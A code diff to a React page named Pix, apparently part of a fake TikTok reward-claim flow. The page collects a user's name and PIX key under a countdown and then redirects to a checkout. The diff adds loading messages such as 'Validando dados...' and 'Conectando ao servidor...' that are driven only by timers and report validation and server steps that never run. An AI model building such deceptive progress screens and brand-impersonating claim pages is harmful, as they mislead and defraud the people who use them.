@@ -19,6 +19,7 @@ const Pix = () => {
   const [countdown, setCountdown] = useState(15 * 60 + 8);
   const [step, setStep] = useState<Step>("main");
   const [loadingProgress, setLoadingProgress] = useState(0);
+  const [loadingStep, setLoadingStep] = useState(0);
   const [nome, setNome] = useState("");
   const [tipoChave, setTipoChave] = useState("");
   const [chavePix, setChavePix] = useState("");
@@ -109,20 +110,38 @@ const Pix = () => {
     return () => clearInterval(interval);
   }, []);
 
-  // Loading progress
+  const loadingMessages = [
+    "Validando dados...",
+    "Conectando ao servidor...",
+    "Concluindo resgate...",
+    "Quase pronto..."
+  ];
+
+  // Loading progress & steps
   useEffect(() => {
     if (step !== "loading") return;
-    const interval = setInterval(() => {
+    setLoadingStep(0);
+    setLoadingProgress(0);
+
+    const stepInterval = setInterval(() => {
+      setLoadingStep((prev) => {
+        if (prev >= 3) { clearInterval(stepInterval); return 3; }
+        return prev + 1;
+      });
+    }, 2000);
+
+    const progressInterval = setInterval(() => {
       setLoadingProgress((prev) => {
         if (prev >= 100) {
-          clearInterval(interval);
+          clearInterval(progressInterval);
           setTimeout(() => navigate("/checkout"), 500);
           return 100;
         }
-        return prev + 2;
+        return prev + 1.25;
       });
-    }, 80);
-    return () => clearInterval(interval);
+    }, 100);
+
+    return () => { clearInterval(stepInterval); clearInterval(progressInterval); };
   }, [step, navigate]);
 
   const mins = Math.floor(countdown / 60);
@@ -135,13 +154,32 @@ const Pix = () => {
   // Fullscreen loading
   if (step === "loading") {
     return (
-      <div className="fixed inset-0 z-50 flex flex-col items-center justify-between bg-white py-10 px-6">
-        <img src={tiktokLogo} alt="TikTok" className="h-7" />
-        <div className="w-full max-w-xs flex flex-col items-center">
-          <p className="text-sm text-gray-500 mb-4">Concluindo resgate...</p>
+      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6">
+        <img src={tiktokLogo} alt="TikTok" className="h-7 mb-16" />
+        <div className="w-full max-w-xs flex flex-col items-center gap-6">
+          <div className="space-y-3 w-full">
+            {loadingMessages.map((msg, i) => (
+              <div
+                key={msg}
+                className={`flex items-center gap-3 transition-all duration-500 ${
+                  i <= loadingStep ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2"
+                }`}
+              >
+                {i < loadingStep ? (
+                  <span className="text-green-500 text-sm">✓</span>
+                ) : i === loadingStep ? (
+                  <span className="h-4 w-4 rounded-full border-2 border-primary border-t-transparent animate-spin" />
+                ) : (
+                  <span className="h-4 w-4" />
+                )}
+                <span className={`text-sm ${i <= loadingStep ? (i < loadingStep ? "text-gray-400" : "text-black font-medium") : "text-gray-300"}`}>
+                  {msg}
+                </span>
+              </div>
+            ))}
+          </div>
           <Progress value={loadingProgress} className="h-1.5 bg-gray-200 [&>div]:bg-primary" />
         </div>
-        <div />
       </div>
     );
   }
